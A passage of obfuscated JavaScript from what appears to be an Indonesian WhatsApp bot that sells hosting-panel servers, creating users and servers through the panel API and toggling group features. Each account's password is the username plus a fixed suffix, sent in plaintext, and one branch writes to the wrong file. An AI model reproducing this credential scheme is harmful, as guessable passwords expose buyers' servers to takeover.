            return _0x4611fa.reply("*Format salah!*\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " user,nomer");
          }
          let _0x5c0634 = _0x25b71d[0];
          let _0x1e419a = _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x25b71d[1] ? _0x25b71d[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4611fa.mentionedJid[0];
          let _0x4c557e = _0x5c0634 + "7GB";
          let _0x2dce78 = global.eggsnya;
          let _0x330e35 = global.location;
          let _0x4aab19 = "7138";
          let _0x5b6c81 = "140";
          let _0x68ca33 = "7138";
          let _0x45bb30 = _0x5c0634 + "@Dáreen Albérich𓆰⸸𓆪";
          akunlo = "https://files.catbox.moe/m6wbpq.jpg";
          if (!_0x1e419a) {
            return;
          }
          let _0x2679e6 = (await _0x221ba4.onWhatsApp(_0x1e419a.split`@`[0]))[0] || {};
          let _0x455ebb = _0x5c0634 + "Dáreen Albérich𓆰⸸𓆪";
          const _0x10eb0d = {
            email: _0x45bb30,
            username: _0x5c0634,
            first_name: _0x5c0634,
            last_name: _0x5c0634,
            language: "en",
            password: _0x455ebb
          };
          let _0x1790c3 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x10eb0d)
          });
          let _0x6db23a = await _0x1790c3.json();
          if (_0x6db23a.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x6db23a.errors[0], null, 2));
          }
          let _0x233763 = _0x6db23a.attributes;
          let _0x3df43d = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2dce78, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x4611fa.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x233763.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG Dáreen Albérich𓆰⸸𓆪,\n> Dáreen Albérich𓆰⸸𓆪Cpanel");
          ctf = "Hai @" + _0x1e419a.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x233763.username + "\n*➣ PASSWORD* : " + _0x455ebb + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Dáreen Albérich𓆰⸸𓆪Cpanel\n";
          const _0x20f5fe = {
            url: akunlo
          };
          const _0x4a0c97 = {
            image: _0x20f5fe,
            caption: ctf
          };
          _0x221ba4.sendMessage(_0x1e419a, _0x4a0c97, {
            quoted: _0x221ba4.chat
          });
          let _0x1b8d5a = await _0x3df43d.json();
          let _0x7b555e = _0x1b8d5a.attributes.startup;
          const _0x3f630a = {
            memory: _0x4aab19,
            swap: 0,
            disk: _0x68ca33,
            io: 500,
            cpu: _0x5b6c81
          };
          let _0xffea7f = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x4c557e,
              description: " ",
              user: _0x233763.id,
              egg: parseInt(_0x2dce78),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x7b555e,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x3f630a,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x330e35)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0xc25ffb = await _0xffea7f.json();
          if (_0xc25ffb.errors) {
            return _0x4611fa.reply(JSON.stringify(_0xc25ffb.errors[0], null, 2));
          }
          let _0x47689e = _0xc25ffb.attributes;
          let _0x4c1474 = await _0x4611fa.reply("\nDáreen Albérich𓆰⸸𓆪 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x233763.id + "\n📌NAME: " + _0x233763.first_name + " " + _0x233763.last_name + "\n💵MEMORY: " + (_0x47689e.limits.memory === 0 ? "Unlimited" : _0x47689e.limits.memory) + " MB\n📦DISK: " + (_0x47689e.limits.disk === 0 ? "Unlimited" : _0x47689e.limits.disk) + " MB\n⌛CPU: " + _0x47689e.limits.cpu + "%\n\n> © Dáreen Albérich𓆰⸸𓆪Cpanel\n");
        }
        break;
      case "8gb":
        {
          if (!_0x1220c9 && !_0x428d53 && !_0x313f24 && !_0x4e5faa) {
            return _0x1d3510(mess.only.premium);
          }
          let _0xf03cc4 = _0x3e94bb.split(",");
          if (_0xf03cc4.length < 2) {
            return _0x4611fa.reply("*Format salah!*\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " user,nomer");
          }
          let _0x121544 = _0xf03cc4[0];
          let _0x50a8bb = _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0xf03cc4[1] ? _0xf03cc4[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4611fa.mentionedJid[0];
          let _0x28dae2 = _0x121544 + "8GB";
          let _0x4bab43 = global.eggsnya;
          let _0x5bd7e2 = global.location;
          let _0x2ed9db = "8138";
          let _0xdb25a1 = "160";
          let _0x17f342 = "8138";
          let _0x565cdc = _0x121544 + "@Dáreen Albérich𓆰⸸𓆪";
          akunlo = "https://files.catbox.moe/m6wbpq.jpg";
          if (!_0x50a8bb) {
            return;
          }
          let _0x1742c6 = (await _0x221ba4.onWhatsApp(_0x50a8bb.split`@`[0]))[0] || {};
          let _0x595e35 = _0x121544 + "Dáreen Albérich𓆰⸸𓆪";
          const _0x42b7ff = {
            email: _0x565cdc,
            username: _0x121544,
            first_name: _0x121544,
            last_name: _0x121544,
            language: "en",
            password: _0x595e35
          };
          let _0x2ac088 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x42b7ff)
          });
          let _0x183663 = await _0x2ac088.json();
          if (_0x183663.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x183663.errors[0], null, 2));
          }
          let _0x3ee835 = _0x183663.attributes;
          let _0x3ee349 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x4bab43, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x4611fa.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x3ee835.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG Dáreen Albérich𓆰⸸𓆪,\n> Dáreen Albérich𓆰⸸𓆪Cpanel");
          ctf = "Hai @" + _0x50a8bb.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x3ee835.username + "\n*➣ PASSWORD* : " + _0x595e35 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Dáreen Albérich𓆰⸸𓆪Cpanel\n";
          const _0xc86336 = {
            url: akunlo
          };
          const _0x35d67e = {
            image: _0xc86336,
            caption: ctf
          };
          _0x221ba4.sendMessage(_0x50a8bb, _0x35d67e, {
            quoted: _0x221ba4.chat
          });
          let _0xb22a8c = await _0x3ee349.json();
          let _0x56787f = _0xb22a8c.attributes.startup;
          const _0x424661 = {
            memory: _0x2ed9db,
            swap: 0,
            disk: _0x17f342,
            io: 500,
            cpu: _0xdb25a1
          };
          let _0x275617 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x28dae2,
              description: " ",
              user: _0x3ee835.id,
              egg: parseInt(_0x4bab43),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x56787f,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x424661,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x5bd7e2)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0xa56cc1 = await _0x275617.json();
          if (_0xa56cc1.errors) {
            return _0x4611fa.reply(JSON.stringify(_0xa56cc1.errors[0], null, 2));
          }
          let _0x218606 = _0xa56cc1.attributes;
          let _0x5288b0 = await _0x4611fa.reply("\n*Dáreen Albérich𓆰⸸𓆪 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x3ee835.id + "\n📌NAME: " + _0x3ee835.first_name + " " + _0x3ee835.last_name + "\n💵MEMORY: " + (_0x218606.limits.memory === 0 ? "Unlimited" : _0x218606.limits.memory) + " MB\n📦DISK: " + (_0x218606.limits.disk === 0 ? "Unlimited" : _0x218606.limits.disk) + " MB\n⌛CPU: " + _0x218606.limits.cpu + "%\n\n> © Dáreen Albérich𓆰⸸𓆪Cpanel\n");
        }
        break;
      case "9gb":
        {
          if (!_0x1220c9 && !_0x428d53 && !_0x313f24 && !_0x4e5faa) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x476100 = _0x3e94bb.split(",");
          if (_0x476100.length < 2) {
            return _0x4611fa.reply("*Format salah!*\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " user,nomer");
          }
          let _0x4394a3 = _0x476100[0];
          let _0xc1bbd0 = _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x476100[1] ? _0x476100[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4611fa.mentionedJid[0];
          let _0x2320d8 = _0x4394a3 + "9GB";
          let _0x574adc = global.eggsnya;
          let _0x4cbe9a = global.location;
          let _0x1e6ec6 = "9138";
          let _0x2a0dcb = "180";
          let _0x1fca0e = "9138";
          let _0x2c2122 = _0x4394a3 + "@Dáreen Albérich𓆰⸸𓆪";
          akunlo = "https://files.catbox.moe/m6wbpq.jpg";
          if (!_0xc1bbd0) {
            return;
          }
          let _0x443632 = (await _0x221ba4.onWhatsApp(_0xc1bbd0.split`@`[0]))[0] || {};
          let _0x3dfe96 = _0x4394a3 + "Dáreen Albérich𓆰⸸𓆪";
          const _0x4d3778 = {
            email: _0x2c2122,
            username: _0x4394a3,
            first_name: _0x4394a3,
            last_name: _0x4394a3,
            language: "en",
            password: _0x3dfe96
          };
          let _0x216799 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x4d3778)
          });
          let _0x277ada = await _0x216799.json();
          if (_0x277ada.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x277ada.errors[0], null, 2));
          }
          let _0x2de0ad = _0x277ada.attributes;
          let _0x40c095 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x574adc, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x4611fa.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x2de0ad.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG Dáreen Albérich𓆰⸸𓆪,\n> Dáreen Albérich𓆰⸸𓆪Cpanel");
          ctf = "Hai @" + _0xc1bbd0.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x2de0ad.username + "\n*➣ PASSWORD* : " + _0x3dfe96 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Dáreen Albérich𓆰⸸𓆪Cpanel\n";
          const _0x108034 = {
            url: akunlo
          };
          const _0x235b78 = {
            image: _0x108034,
            caption: ctf
          };
          _0x221ba4.sendMessage(_0xc1bbd0, _0x235b78, {
            quoted: _0x221ba4.chat
          });
          let _0xa4852a = await _0x40c095.json();
          let _0x186837 = _0xa4852a.attributes.startup;
          const _0x4894a9 = {
            memory: _0x1e6ec6,
            swap: 0,
            disk: _0x1fca0e,
            io: 500,
            cpu: _0x2a0dcb
          };
          let _0x50d271 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x2320d8,
              description: " ",
              user: _0x2de0ad.id,
              egg: parseInt(_0x574adc),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x186837,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x4894a9,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x4cbe9a)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x210568 = await _0x50d271.json();
          if (_0x210568.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x210568.errors[0], null, 2));
          }
          let _0x42151f = _0x210568.attributes;
          let _0x3eddde = await _0x4611fa.reply("\nDáreen Albérich𓆰⸸𓆪 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x2de0ad.id + "\n📌NAME: " + _0x2de0ad.first_name + " " + _0x2de0ad.last_name + "\n💵MEMORY: " + (_0x42151f.limits.memory === 0 ? "Unlimited" : _0x42151f.limits.memory) + " MB\n📦DISK: " + (_0x42151f.limits.disk === 0 ? "Unlimited" : _0x42151f.limits.disk) + " MB\n⌛CPU: " + _0x42151f.limits.cpu + "%\n\n> © Dáreen Albérich𓆰⸸𓆪Cpanel\n");
        }
        break;
      case "10gb":
        {
          if (!_0x1220c9 && !_0x428d53 && !_0x313f24 && !_0x4e5faa) {
            return _0x1d3510(mess.only.premium);
          }
          let _0x348c23 = _0x3e94bb.split(",");
          if (_0x348c23.length < 2) {
            return _0x4611fa.reply("*Format salah!*\nPenggunaan:\n" + (_0x137417 + _0x53d4d1) + " user,nomer");
          }
          let _0x13a404 = _0x348c23[0];
          let _0x5b1ed8 = _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x348c23[1] ? _0x348c23[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x4611fa.mentionedJid[0];
          let _0x56136d = _0x13a404 + "10gb";
          let _0x398242 = global.eggsnya;
          let _0x56863b = global.location;
          let _0x204a95 = "10000";
          let _0x59ca8b = "200";
          let _0x4e3212 = "10000";
          let _0x4fb2ea = _0x13a404 + "@Dáreen Albérich𓆰⸸𓆪";
          akunlo = "https://files.catbox.moe/m6wbpq.jpg";
          if (!_0x5b1ed8) {
            return;
          }
          let _0x53419b = (await _0x221ba4.onWhatsApp(_0x5b1ed8.split`@`[0]))[0] || {};
          let _0x2a85cc = _0x13a404 + "Dáreen Albérich𓆰⸸𓆪";
          const _0x47c45a = {
            email: _0x4fb2ea,
            username: _0x13a404,
            first_name: _0x13a404,
            last_name: _0x13a404,
            language: "en",
            password: _0x2a85cc
          };
          let _0xa07ba1 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify(_0x47c45a)
          });
          let _0x19985e = await _0xa07ba1.json();
          if (_0x19985e.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x19985e.errors[0], null, 2));
          }
          let _0x13e069 = _0x19985e.attributes;
          let _0x5c3aed = await fetch(domain + "/api/application/nests/5/eggs/" + _0x398242, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x4611fa.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x13e069.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG Dáreen Albérich𓆰⸸𓆪,\n> Dáreen Albérich𓆰⸸𓆪Cpanel");
          ctf = "Hai @" + _0x5b1ed8.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x13e069.username + "\n*➣ PASSWORD* : " + _0x2a85cc + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Dáreen Albérich𓆰⸸𓆪Cpanel\n";
          const _0x18c052 = {
            url: akunlo
          };
          const _0x3bd4ee = {
            image: _0x18c052,
            caption: ctf
          };
          _0x221ba4.sendMessage(_0x5b1ed8, _0x3bd4ee, {
            quoted: _0x221ba4.chat
          });
          let _0x5a084a = await _0x5c3aed.json();
          let _0x3afcb2 = _0x5a084a.attributes.startup;
          _0x221ba4;
          const _0x27d6fa = {
            memory: _0x204a95,
            swap: 0,
            disk: _0x4e3212,
            io: 500,
            cpu: _0x59ca8b
          };
          let _0x5ca5f4 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x56136d,
              description: " ",
              user: _0x13e069.id,
              egg: parseInt(_0x398242),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x3afcb2,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: _0x27d6fa,
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x56863b)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x4c54ad = await _0x5ca5f4.json();
          if (_0x4c54ad.errors) {
            return _0x4611fa.reply(JSON.stringify(_0x4c54ad.errors[0], null, 2));
          }
          let _0x275c4e = _0x4c54ad.attributes;
          let _0x1da42f = await _0x4611fa.reply("\n*Dáreen Albérich𓆰⸸𓆪 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x13e069.id + "\n📌NAME: " + _0x13e069.first_name + " " + _0x13e069.last_name + "\n💵MEMORY: " + (_0x275c4e.limits.memory === 0 ? "Unlimited" : _0x275c4e.limits.memory) + " MB\n📦DISK: " + (_0x275c4e.limits.disk === 0 ? "Unlimited" : _0x275c4e.limits.disk) + " MB\n⌛CPU: " + _0x275c4e.limits.cpu + "%\n\n> © Dáreen Albérich𓆰⸸𓆪Cpanel\n");
        }
        break;
      case "akses":
        if (!_0x2ec274) {
          return _0x4611fa.reply("Khusus Group");
        }
        if (!_0x1220c9) {
          return _0x4611fa.reply("Fitur Ini Khusus Owner Dáreen Albérich𓆰⸸𓆪,, Lu Siapa Mainin Fitur Ini? ");
        }
        _0x391104.push(_0x4611fa.chat);
        fs3.writeFileSync("./database/idgrup.json", JSON.stringify(_0x391104));
        _0x4611fa.reply(_0x53d4d1 + " sukses");
        break;
      case "delakses":
        if (!_0x1220c9) {
          return _0x4611fa.reply("Fitur Ini Khusus Owner Dáreen Albérich𓆰⸸𓆪,, Lu Siapa Mainin Fitur Ini?");
        }
        if (!_0x2ec274) {
          return _0x4611fa.reply("Khusus Group");
        }
        var _0xb7ff72 = _0x391104.indexOf(_0x4611fa.chat);
        _0x391104.splice(_0xb7ff72, 1);
        fs3.writeFileSync("./database/idgrup.json", JSON.stringify(_0x391104));
        _0x4611fa.reply(_0x53d4d1 + " sukses");
        break;
      case "antilink":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3c8260) {
            return _0x4611fa.reply("Bot harus menjadi admin");
          }
          if (_0x18d0e5[0] === "on") {
            if (_0x2eafe1) {
              return _0x4611fa.reply("Udah aktif");
            }
            _0x8a5657.push(_0x4611fa.chat);
            fs3.writeFileSync("./database/antilink.json", JSON.stringify(_0x8a5657, null, 2));
            _0x1d3510("Successfully Activate Antilink In This Group");
          } else if (_0x18d0e5[0] === "off") {
            if (!_0x2eafe1) {
              return _0x4611fa.reply("Udah nonaktif");
            }
            let _0x4f732d = _0x8a5657.indexOf(_0x4611fa.chat);
            _0x8a5657.splice(_0x4f732d, 1);
            fs3.writeFileSync("./database/antilink.json", JSON.stringify(_0x8a5657, null, 2));
            _0x1d3510("Successfully Disabling Antilink In This Group");
          } else {
            _0x1d3510("Kirim perintah " + (_0x137417 + _0x53d4d1) + " on/off\n\nContoh: " + (_0x137417 + _0x53d4d1) + " on");
          }
        }
        break;
      case "welcome":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (_0x18d0e5[0] === "on") {
            if (_0x3f7a9a) {
              return _0x4611fa.reply("Udah on");
            }
            _0x4fd0b8.push(_0x4611fa.chat);
            fs3.writeFileSync("./database/welcome.json", JSON.stringify(_0x4fd0b8, null, 2));
            _0x1d3510("Sukses mengaktifkan welcome di grup ini");
          } else if (_0x18d0e5[0] === "off") {
            if (!_0x3f7a9a) {
              return _0x4611fa.reply("Udah off");
            }
            let _0x58b7c3 = _0x4fd0b8.indexOf(_0x4611fa.chat);
            _0x4fd0b8.splice(_0x58b7c3, 1);
            fs3.writeFileSync("./database/welcome.json", JSON.stringify(_0x4fd0b8, null, 2));
            _0x1d3510("Sukses menonaktifkan welcome di grup ini");
          } else {
            _0x1d3510("Kirim perintah " + (_0x137417 + _0x53d4d1) + " on/off\n\nContoh: " + (_0x137417 + _0x53d4d1) + " on");
          }
        }
        break;
      case "left":
      case "goodbye":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (_0x18d0e5[0] === "on") {
            if (_0x129a67) {
              return _0x4611fa.reply("Udah on");
            }
            _0x257f16.push(_0x4611fa.chat);
            fs3.writeFileSync("./database/left.json", JSON.stringify(_0x257f16, null, 2));
            _0x1d3510("Sukses mengaktifkan goodbye di grup ini");
          } else if (_0x18d0e5[0] === "off") {
            if (!_0x129a67) {
              return _0x4611fa.reply("Udah off");
            }
            let _0x58fed3 = _0x257f16.indexOf(_0x4611fa.chat);
            _0x257f16.splice(_0x58fed3, 1);
            fs3.writeFileSync("./database/welcome.json", JSON.stringify(_0x257f16, null, 2));
            _0x1d3510("Sukses menonaktifkan goodbye di grup ini");
          } else {
            _0x1d3510("Kirim perintah " + (_0x137417 + _0x53d4d1) + " on/off\n\nContoh: " + (_0x137417 + _0x53d4d1) + " on");
          }
        }
        break;
      case "setwelcome":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x1220c9 && !_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus owner!");
          }
          if (!_0x3e94bb) {
            return _0x4611fa.reply("Gunakan dengan cara " + _0x53d4d1 + " *teks_welcome*\n\n_Contoh_\n\n" + _0x53d4d1 + " Halo @user, Selamat datang di @group");
          }
          if (isSetWelcome(_0x4611fa.chat, _0x2cf937)) {
            return _0x4611fa.reply("Set welcome already active");
          }
          addSetWelcome(_0x3e94bb, _0x4611fa.chat, _0x2cf937);
          _0x1d3510("Successfully set welcome!");
        }
        break;
      case "changewelcome":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x1220c9 && !_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus owner!");
          }
          if (!_0x3e94bb) {
            return _0x4611fa.reply("Gunakan dengan cara " + _0x53d4d1 + " *teks_welcome*\n\n_Contoh_\n\n" + _0x53d4d1 + " Halo @user, Selamat datang di @group");
          }
          if (isSetWelcome(_0x4611fa.chat, _0x2cf937)) {
            changeSetWelcome(q, _0x4611fa.chat, _0x2cf937);
            _0x1d3510("Sukses change set welcome teks!");
          } else {
            addSetWelcome(q, _0x4611fa.chat, _0x2cf937);
            _0x1d3510("Sukses change set welcome teks!");
          }
        }
        break;
      case "delsetwelcome":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x1220c9 && !_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus owner!");
          }
          if (!isSetWelcome(_0x4611fa.chat, _0x2cf937)) {
            return _0x4611fa.reply("Belum ada set welcome di sini..");
          }
          removeSetWelcome(_0x4611fa.chat, _0x2cf937);
          _0x1d3510("Sukses delete set welcome");
        }
        break;
      case "setleft":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x1220c9 && !_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus owner!");
          }
          if (!_0x3e94bb) {
            return _0x4611fa.reply("Gunakan dengan cara " + (_0x137417 + _0x53d4d1) + " *teks_left*\n\n_Contoh_\n\n" + (_0x137417 + _0x53d4d1) + " Halo @user, Selamat tinggal dari @group");
          }
          if (isSetLeft(_0x4611fa.chat, _0x33cb69)) {
            return _0x4611fa.reply("Set left already active");
          }
          addSetLeft(q, _0x4611fa.chat, _0x33cb69);
          _0x1d3510("Successfully set left!");
        }
        break;
      case "changeleft":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x1220c9 && !_0x13697b) {
